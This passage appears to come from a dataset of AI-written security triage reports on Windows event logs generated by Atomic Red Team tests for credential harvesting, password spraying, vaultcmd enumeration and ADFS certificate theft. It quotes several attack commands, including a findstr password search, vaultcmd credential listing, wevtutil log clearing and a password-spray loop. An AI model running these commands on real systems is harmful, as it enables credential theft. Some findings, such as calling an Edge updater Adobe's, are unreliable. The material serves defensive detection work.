   - The PowerShell log indicates an invocation of a PowerShell command searching for passwords in files with extensions like `.xml`, `.doc`, `.txt`, and `.xls`. The command lines captured (""findstr /si pass *.xml *.doc *.txt *.xls ls -R | select-string -Erroraction SilentlyContinue -Pattern password"") point towards credential harvesting techniques.

3. **Repeated Use of `wevtutil.exe`:**
   - There is a repeated execution of `wevtutil.exe` to clear event logs, which strongly suggests attempts to obfuscate or hide malicious activity on the system.

4. **Indicators from Sysmon Logs:**
   - Instances of process executions related to `wevtutil.exe` and specific power utilities within Sysmon logs are consistent with the activities of log clearing and unauthorized system access.

5. **Security Log Events:**
   - Event ID 1102 in the Security log, which indicates the clearing of the security log by the same `admin_test` user, is significant and an indicator of potential malicious intent.

6. **Kernel Time Manipulation:**
   - Event IDs 24 and 1 in the System log from Microsoft-Windows-Kernel-General suggest time changes that might have been an attempt to manipulate system time to evade timestamp-based log analysis.

### Assessment of the Situation:

Given the actions of clearing logs, suspicious PowerShell command executions searching for passwords, and attempts to clear logs using `wevtutil.exe`, the analyzed logs strongly suggest malicious activity.

### Resolution:

- **MALICIOUS**: This assessment is categorized as 100% malicious due to the clear indicators of malicious behavior aimed at hiding and potentially preparing for further misuse or data exfiltration.

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Isolate the affected system (Server002) from the network to prevent further potential damage or data exfiltration.
   - Preserve all logs and system state for a more in-depth forensic analysis.

2. **Thorough Investigation:**
   - Conduct a comprehensive forensic investigation to determine the extent of the compromise and identify any additional malicious artifacts present on the system.
   - Check for unauthorized access and potential data exfiltration activities.

3. **Review User Accounts:**
   - Audit and possibly disable/secure the `admin_test` account to review all actions associated with it and assess for other compromised accounts.

4. **Strengthening Security Measures:**
   - Review and enhance logging and monitoring policies to catch malicious activities effectively in the future.
   - Implement stricter access controls and keep software, especially security-related and OS components, up to date.

5. **Team De-Brief:**
   - Conduct a post-incident review to ensure new controls are in place to prevent similar occurrences in the future. 

Deploy these steps in coordination with IT security teams, and potentially involve third-party experts if the internal expertise is insufficient for a thorough forensic response."
List Credential Files via PowerShell,"Upon reviewing the provided Windows event logs, several activities stand out that raise concerns about the potential for malicious activity:

1. **Log Clearing**: There is evidence of the use of the `wevtutil.exe` command to clear logs. Specifically, these Sysmon events show various uses of ""wevtutil.exe"" for clearing event logs:
   - Security logs cleared by `wevtutil.exe` (ProcessId: 7156).
   - Application logs cleared by `wevtutil.exe` (ProcessId: 3288).
   - System logs cleared by `wevtutil.exe` (ProcessId: 3736).

   Event ID 1102 in the security log indicates that the Windows security log was cleared. Log clearing is often a tactic used to cover tracks and can be indicative of malicious activity.

2. **PowerShell Execution**: The PowerShell logs indicate that a PowerShell script was executed, which checked for hidden directories containing credentials (notably in the `Roaming` and `Local` directories under `AppData`). The relevant PowerShell commands extracted credentials related directories:
   - Commands attempted to access hidden directories which is suspicious, indicating possible credential harvesting.

3. **Time Manipulation**: The changes in system time, as indicated by Event ID 4616 (Security log), may correspond with an attempt to manipulate timestamps to obfuscate activities. This kind of behavior could be an attempt to alter timestamps to disorient conventional log review methods.

4. **Use of Built-in Windows Tools**: Execution of utilities such as `whoami.exe`, `hostname.exe`, and others was noted. While these utilities are not inherently malicious, their usage can indicate an attacker gathering information about the system environment or logged-in users, often as part of the initial stages of compromise or to confirm a successful intrusion.

5. **Edge Update Activities**: Multiple updates and installations tied to Microsoft Edge are seen. While updates can be legitimate, the frequency and the method of execution through directories like `Temp` can sometimes indicate exploitation or a way to execute code inadvertently if used in a compromised manner.

**Summary & Assessment**:
- **SUSPICIOUS**: The activities present in the logs, particularly the clearing of logs using `wevtutil.exe`, the suspicious PowerShell commands targeting potential credential paths, and system time manipulation, suggest behavior associated with attempts to cover malicious activity or preparation for such activities.
  
**Recommended Actions**:
1. **Investigate Log Clearing**: Determine who initiated the log clearing and their justification. Audit user action and access rights, especially ""admin_test"".
2. **Review PowerShell Scripts**: Examine the origin of the PowerShell scripts and any potential downloads or other scripts that may have been executed within the same period.
3. **System Analysis**: Conduct a thorough system integrity check and ensure all systems are updated to prevent exploitation of known vulnerabilities.
4. **Enhanced Monitoring**: Apply enhanced monitoring to identify further suspicious behavior, especially focusing on administrative accounts.
5. **Credential Change**: Consider resetting credentials, particularly those involved with `admin_test`, given the suspicious access to credential directories.

A deeper forensic analysis is advised to validate suspicions and confirm whether any data was exfiltrated or if further persistence mechanisms were established by potential adversaries."
Password Spray all Domain Users,"Upon carefully analyzing the provided Windows event logs, a few indicators of potentially suspicious behavior have been identified. Let's break down the relevant findings:

1. **Repeated Command Executions with High Integrity**: Multiple instances where `cmd.exe` is launched with command-line arguments such as `if not exist %%temp%%\users.txt (exit /b 1)`. This pattern is repeated several times, a typical script used for environment checking, and its execution is in a directory typically accessed for temporary execution purposes (e.g., `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`). The integrity level of these processes is high, indicating they are running with elevated privileges, possibly under an administrative context (`SERVER002\\admin_test`) which means more risk if these commands are malicious.

2. **Execution of Scripts**: The command `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1110.003\\src\\parse_net_users.bat""` suggests the execution of batch files related to attack simulations. The directory `AtomicRedTeam` is known to be associated with a repository for testing security functionalities. While this hints towards a test or simulation, without proper context or documentation confirming this as part of scheduled or approved pen-type testing, it's noteworthy.

3. **Event Log Clearing**: The logs indicate multiple instances of log clearing events, with event 1102 in the Security log, and 104 in the System log, indicating that logs for System, Security, and Windows PowerShell channels were cleared at around the same timestamp by the same user `admin_test`. This behavior is often associated with attempts to cover tracks after malicious activities, especially in combination with the high-integrity level commands mentioned above.

4. **Use of `wevtutil` Tool**: The `wevtutil.exe` tool was executed several times to clear logs, as indicated by the presence of associated `cl` (clear) commands in the command line. This is another strong indicator of attempts to hide any traces of activity.

5. **Network and Privilege Execution**: The command observed in the log `""cmd.exe"" /c @FOR /F %%n in (%%temp%%\\users.txt) do ...` appears to automate the use of a network resource via command line, potentially indicating lateral movement attempts or scanning activities using presumed password (`Spring2020`). This attempts passwords on available accounts stored in `users.txt`.

6. **Time Anomalies**: There are events indicating time adjustments which can sometimes suggest attempts to manipulate timestamps on logs.

Overall, these logs indicate activities that are not typically expected in regular operation or administration. Multiple factors converge towards indicators of malicious intent, including the clearing of system logs, execution of scripts potentially related to password testing, and the running of processes with high privileges.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- Conduct a thorough investigation of the `admin_test` user activities and verify if this was part of any authorized security test campaigns. 
- Review and verify the legitimacy of any assumed organizational use of Atomic Red Team tools.
- Immediately implement enhanced monitoring on the host to capture any new activities. 
- Initiate a forensic process on the host to understand the scope of the compromise, checking for data exfiltration or further network compromises.
- Notify necessary security teams and executives to begin incident response protocols.
- Consider isolating the affected server until a full incident response and remediation can be executed."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"### Detailed Analysis of Logs

#### Observed Activities
1. **PowerShell Execution**:
   - The PowerShell logs indicate the execution of a command involving `vaultcmd /listcreds:""Web Credentials"" /all`. This command extracts credential information stored in the Windows Credential Vault, which is unusual unless done for security audits or investigations.
   
2. **Log Clearing**:
   - Multiple events show that event logs (System, Windows PowerShell, and Security) were cleared by a user with the username `admin_test`. This activity can be a sign of malicious activity, as an attacker might clear logs to remove traces of unauthorized actions.

3. **System and Security Events**:
   - Windows Time Service logs show time adjustments, which can be typical, but if malicious, altering system time could disrupt log timestamps.
   
4. **Sysmon Observations**:
   - Various processes were executed, including `wevtutil.exe` for clearing event logs. This utility is commonly used by attackers post-compromise to hide their tracks.
   - There is a significant number of Microsoft Edge Update related activities. While this alone isn't necessarily suspicious, it is crucial to determine if these updates align with legitimate activity, as attackers can exploit software updates.

5. **User Activity**:
   - Most of the command executions and log clearances were done under the `SERVER002\admin_test` account, showing potential misuse of administrative privileges.

#### Indicators of Susicious or Malicious Activity
1. **Credential Access**:
   - The command to list web credentials in PowerShell without a clear business need can indicate an attempt to harvest credentials, which is suspicious.
   
2. **Log Cleansing**:
   - The clearing of multiple logs within a short timeframe is a strong indicator of malicious activity, often aiming to remove evidence of a security-related event.
   
3. **Edge Update Anomalies**:
   - The sheer volume and density of Edge Update activities could be an indicator of exploitation or misuse of legitimate processes to carry out malicious tasks.

#### Assessment and Resolution
The pattern of clearing multiple event logs, examining stored credentials via PowerShell, and unusual volume of update activities particularly stand out as highly suspicious. While it's not definitively proving compromise without further context (e.g., external connections, alarms on endpoint security), these activities certainly warrant a more in-depth investigation.

### Resolution
**Resolution: SUSPICIOUS**
- **Actionable Guidance**:
  - Conduct a forensic analysis to recover and review deleted event logs if possible.
  - Investigate the user account `admin_test` for any anomalies in its activity or origin.
  - Review network logs to pinpoint any unusual data exfiltration or command-and-control channels.
  - Consider isolating the impacted system(s) until a complete investigative report can affirm the system’s integrity.
  - Strengthen monitoring on similar activities across other systems in the network to prevent potential widespread attack.

These steps will help to determine if these activities represent an actual intrusion and aid in remediation if needed."
ADFS token signing and encryption certificates theft - Remote,"Based on the detailed review and correlation of the provided Windows event logs, several key points with potential indicators of compromise were identified. Here's a breakdown of the suspicious and likely malicious activities detected within these logs:

1. **Time Manipulation**:
   - The logs indicate that the system time was adjusted backward (Event ID 4616 in Security log), which can be a method used by attackers to manipulate timestamps of logs to hide their tracks or align the timeline of various events to obfuscate activities.

2. **Log Clearing Activity**:
   - Multiple log files have been cleared without any backup path, such as Security, System, and Windows PowerShell logs (Event ID 1102 in Security log and Event ID 104 in System log). This is typically a suspicious activity aimed at covering tracks after executing malicious activities.

3. **Suspicious PowerShell Activity**:
   - There is evidence of PowerShell being used to execute a complex script that involves importing modules like `ActiveDirectory` and `AADInternals` which can be used for tasks such as retrieving NT hashes (DCSync attack) and extracting configurations (possibly sensitive ADFS configurations). This activity is particularly concerning as it is seen using potentially stolen credentials (evidenced by commands aiming to retrieve ADFS service account NT hash).

4. **Process Execution**:
   - The suspicious PowerShell command was executed with high integrity level by a user named ""admin_test"", possibly indicating privilege abuse or malicious use of an administrative account (Sysmon Event ID 1 showing execution of `wevtutil.exe` with high integrity followed by log clearing commands).
   
5. **Edge Update Process**:
   - The frequent spawning of Microsoft Edge Update processes may appear standard, but the presence of Adobe’s `MicrosoftEdgeUpdateComRegisterShell64.exe` being triggered under `NT AUTHORITY\SYSTEM` within a short span raises concerns of a potential avenue for persistence or lateral movement.

**Assessment and Resolution**:

- **Findings**: The activities described, especially the time manipulation, log clearance with no backup, and misuse of PowerShell with potentially malicious intentions clearly indicate the possibility of compromise. The combination of these factors, particularly involving indicators like elevated PowerShell use for potential credential theft (DCSync), strongly indicates malicious intent.

- **Recommendation**: Immediate containment is necessary. Network isolation of Server002 should be considered to prevent further potential data exfiltration or lateral movement. A full forensic investigation should be undertaken to ascertain the extent of the compromise, verify potential data breaches, and implement necessary remediation and hardening measures.

- **Final Resolution**: **MALICIOUS -** The evidence presented strongly supports malicious activity. Immediate action is required to mitigate further risk and investigate for potential compromises across other connected systems."
